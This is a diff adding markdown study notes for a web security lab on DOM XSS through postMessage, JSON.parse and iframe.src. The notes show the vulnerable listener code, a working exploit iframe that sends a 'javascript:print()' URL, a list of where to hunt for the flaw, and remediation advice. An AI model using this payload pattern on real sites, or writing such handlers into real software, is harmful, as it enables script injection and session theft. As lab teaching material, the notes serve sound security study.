@@ -985,3 +985,634 @@ startsWith("https://trusted-site.com")
 ## 🧠 FINAL ONE-LINE MEMORY
 
 Unsafe postMessage input is directly assigned to `location.href` without validation, allowing `javascript:` execution and DOM XSS.
+
+---
+
+# 📌Lab-3 DOM XSS using Web Messages + JSON Parsing + iframe.src
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates a DOM-based XSS vulnerability using:
+
+- Web Messages
+- JSON parsing
+- iframe source manipulation
+
+The vulnerable page:
+
+- listens for incoming `postMessage()` messages
+- parses messages using `JSON.parse()`
+- checks type using `switch`
+- loads attacker-controlled data into `iframe.src`
+
+Because the application:
+
+- does not verify sender origin
+- trusts attacker-controlled JSON
+- directly uses user-controlled URLs in dangerous sinks
+
+an attacker can execute JavaScript in the victim’s browser.
+
+---
+
+## 🧠 What Is The Topic?
+
+This topic combines several DOM concepts together:
+
+| Concept | Meaning |
+|---|---|
+| Web Messages | Browser communication between windows/iframes |
+| postMessage() | API used to send data between pages |
+| JSON.parse() | Converts string → JavaScript object |
+| switch statement | Executes functionality based on message type |
+| Sink | Dangerous function/property |
+| iframe.src | Loads URL/code into iframe |
+| javascript: URL | Executes JavaScript instead of webpage |
+
+---
+
+## ⚠️ Core Concept
+
+Application expects messages like:
+
+```json
+{
+  "type":"load-channel",
+  "url":"https://safe-site.com/video"
+}
+```
+
+Developer intention:
+
+- trusted page sends message
+- website loads safe content into iframe
+
+Attacker sends:
+
+```json
+{
+  "type":"load-channel",
+  "url":"javascript:print()"
+}
+```
+
+Now application loads JavaScript instead of safe content.
+
+---
+
+## 🧩 Important DOM Concepts
+
+### 📥 Source
+
+Attacker-controlled source:
+
+```javascript
+e.data
+```
+
+because it comes from:
+
+```javascript
+postMessage()
+```
+
+---
+
+### 🔄 Parsing
+
+Application converts string → object using:
+
+```javascript
+JSON.parse(e.data)
+```
+
+---
+
+### 🧠 switch()
+
+Application checks:
+
+```javascript
+switch(data.type)
+```
+
+Example:
+
+| type value | functionality |
+|---|---|
+| play-video | play video |
+| pause-video | pause |
+| load-channel | load iframe URL |
+
+---
+
+### ☠️ Sink
+
+Dangerous sink:
+
+```javascript
+ACMEplayer.element.src = data.url;
+```
+
+Attacker controls:
+
+```javascript
+data.url
+```
+
+Therefore attacker controls iframe source.
+
+---
+
+## 🧪 Vulnerable Code Breakdown
+
+### 🖼️ SS - View Source (Vulnerable JSON Parsing Code)
+
+![ss1](view-source-json-code.png)
+
+Example vulnerable code:
+
+```javascript
+window.addEventListener('message', function(e) {
+
+    var data = JSON.parse(e.data);
+
+    switch(data.type) {
+
+        case "load-channel":
+            ACMEplayer.element.src = data.url;
+            break;
+    }
+
+});
+```
+
+---
+
+## 🔍 Code Flow Breakdown
+
+### 🧭 Step 1 — Event Listener Waits
+
+```javascript
+window.addEventListener('message', ...)
+```
+
+Meaning:
+
+```text
+Wait for incoming postMessage() data
+```
+
+---
+
+### 📩 Step 2 — Message Arrives
+
+Attacker sends:
+
+```javascript
+postMessage(...)
+```
+
+Browser stores it in:
+
+```javascript
+e.data
+```
+
+---
+
+### 🔄 Step 3 — JSON Parsing
+
+Application converts:
+
+FROM:
+
+```json
+"{\"type\":\"load-channel\"}"
+```
+
+TO:
+
+```json
+{
+  "type":"load-channel"
+}
+```
+
+---
+
+### 🔀 Step 4 — switch Checks Type
+
+```javascript
+switch(data.type)
+```
+
+If type equals:
+
+```text
+load-channel
+```
+
+matching functionality executes.
+
+---
+
+### ☠️ Step 5 — Dangerous Action
+
+```javascript
+ACMEplayer.element.src = data.url;
+```
+
+Attacker controls:
+
+```javascript
+data.url
+```
+
+Therefore attacker controls iframe source.
+
+---
+
+## 🧪 Lab Walkthrough (Full Detailed Steps)
+
+### 🌐 Step 1 — Open Lab
+
+Visit lab homepage.
+
+Notice JavaScript contains:
+
+- `addEventListener('message')`
+- `JSON.parse()`
+- `switch()`
+- `iframe.src`
+
+This indicates:
+
+- web message handling
+- attacker-controlled sink
+
+---
+
+### 🧠 Step 2 — Understand Expected JSON Structure
+
+Application expects:
+
+```json
+{
+  "type":"load-channel",
+  "url":"SOME_URL"
+}
+```
+
+---
+
+### 🚀 Step 3 — Go To Exploit Server
+
+Open exploit server.
+
+Create attacker-controlled page.
+
+---
+
+### 💣 Step 4 — Build Exploit iframe
+
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
+onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+```
+
+---
+
+## 🔍 Payload Breakdown
+
+### 🖼️ iframe
+
+```html
+<iframe src="victim-site">
+```
+
+Loads victim site inside attacker page.
+
+---
+
+### ⚙️ onload
+
+```javascript
+onload='...'
+```
+
+Runs JavaScript after iframe fully loads.
+
+---
+
+### 🪟 this.contentWindow
+
+Refers to:
+
+```text
+actual page/window inside iframe
+```
+
+---
+
+### 📨 postMessage()
+
+```javascript
+postMessage(message, targetOrigin)
+```
+
+Sends data to another page.
+
+---
+
+### 🧾 JSON String
+
+```json
+{
+  "type":"load-channel",
+  "url":"javascript:print()"
+}
+```
+
+---
+
+### ❓ Why "load-channel"?
+
+Because switch checks:
+
+```javascript
+switch(data.type)
+```
+
+We must match valid functionality.
+
+---
+
+### ⚠️ Why javascript:print()?
+
+Because:
+
+```text
+javascript:
+```
+
+tells browser:
+
+```text
+execute JavaScript code
+```
+
+instead of loading webpage.
+
+---
+
+### 🌍 Why "*" ?
+
+```text
+"*"
+```
+
+means:
+
+```text
+send message regardless of origin
+```
+
+---
+
+## 🔄 Browser Execution Flow
+
+### 🧭 Step 1
+
+```text
+Attacker page loads victim iframe
+```
+
+---
+
+### 🧭 Step 2
+
+```text
+Iframe finishes loading
+```
+
+---
+
+### 🧭 Step 3
+
+```text
+onload executes
+```
+
+---
+
+### 🧭 Step 4
+
+```text
+postMessage sends malicious JSON
+```
+
+---
+
+### 🧭 Step 5
+
+```text
+Victim receives message
+```
+
+---
+
+### 🧭 Step 6
+
+Application runs:
+
+```javascript
+JSON.parse(e.data)
+```
+
+---
+
+### 🧭 Step 7
+
+switch matches:
+
+```text
+load-channel
+```
+
+---
+
+### 🧭 Step 8
+
+Application runs:
+
+```javascript
+iframe.src = "javascript:print()"
+```
+
+---
+
+### 🧭 Step 9
+
+Browser executes:
+
+```javascript
+print()
+```
+
+---
+
+## 🚨 Why This Vulnerability Exists
+
+Because application:
+
+- trusts incoming messages
+- has no origin verification
+- trusts attacker-controlled JSON
+- uses attacker-controlled URL in dangerous sink
+
+---
+
+## 🌍 Real-World Scenarios
+
+### 🎥 Embedded Video Players
+
+Loading videos/channels dynamically.
+
+---
+
+### 📢 Advertisement Widgets
+
+Receiving instructions from parent windows.
+
+---
+
+### 💳 Payment Popups
+
+Cross-window communication between payment providers and websites.
+
+---
+
+### 🔐 OAuth/Login Popups
+
+Authentication windows communicating tokens.
+
+---
+
+## 🎯 High-Value Endpoints
+
+Look for:
+
+- iframe communication
+- embedded widgets
+- video players
+- chat systems
+- ad systems
+- payment systems
+- OAuth popups
+
+Search JavaScript for:
+
+```javascript
+postMessage
+message
+JSON.parse
+window.addEventListener
+iframe.src
+location.href
+```
+
+---
+
+## 🔗 Multi-Chain Attack Possibilities
+
+| Vulnerability | Result |
+|---|---|
+| DOM XSS | Full JS execution |
+| Open Redirect | Redirect users |
+| CSRF | Forced actions |
+| Token Theft | Steal JWT/session |
+| Clickjacking | UI manipulation |
+| OAuth flaws | Account takeover |
+
+---
+
+## 🛡️ Remediation
+
+Verify origin strictly.
+
+BAD:
+
+```javascript
+if(origin.indexOf("trusted.com") > -1)
+```
+
+GOOD:
+
+```javascript
+if(origin === "https://trusted.com")
+```
+
+---
+
+Never trust `postMessage` data.
+
+Validate:
+
+- structure
+- type
+- allowed values
+
+---
+
+Block:
+
+```text
+javascript:
+```
+
+Allow only:
+
+- `https:`
+- safe domains
+
+---
+
+Avoid dangerous sinks:
+
+```javascript
+iframe.src
+innerHTML
+eval()
+location.href
+```
+
+with attacker-controlled data.
+
+---
+
+## 🧠 Mental Model
+
+```text
+Attacker page
+    ↓
+postMessage(JSON)
+    ↓
+Victim receives message
+    ↓
+JSON.parse()
+    ↓
+switch(type)
+    ↓
+iframe.src = attacker URL
+    ↓
+javascript: executes
+```
+
+---
+
+## 🧠 Final One-Line Understanding
+
+Attacker sends crafted JSON through `postMessage`, the victim page blindly parses and trusts it, then loads attacker-controlled JavaScript into `iframe.src`, resulting in DOM XSS.
